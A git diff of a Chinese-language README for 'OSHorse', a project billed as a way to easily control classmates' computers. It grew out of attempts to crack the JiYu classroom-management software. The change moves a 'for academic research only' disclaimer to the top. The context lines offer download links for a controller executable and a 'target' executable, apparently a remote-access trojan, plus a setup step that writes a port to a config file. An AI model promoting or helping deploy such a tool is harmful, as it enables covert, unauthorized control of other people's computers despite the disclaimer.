@@ -1,4 +1,5 @@
 # OSHorse，轻松控制同学电脑！
+### 免责声明：仅供学术研究使用。对于违反相关法律、造成危害的滥用行为，开发者不负任何责任。
 
 ## 有关这个项目
 最近一直在找机会研究如何破解极域电子教室，结果百度了几下，看到某篇利用电子教室控制同学的教程。
@@ -59,5 +60,3 @@ echo [端口]>>connect.txt
 [下载HorseCommander.exe(控制)](https://helloosdisk.wdfiles.com/local--files/file:software/HorseCommander.exe)
 
 [下载connecter.exe(目标)](https://helloosdisk.wdfiles.com/local--files/file:software/connecter.exe)
-
-### 免责声明：仅供学术研究使用。对于违反相关法律、造成危害的滥用行为，开发者不负任何责任。
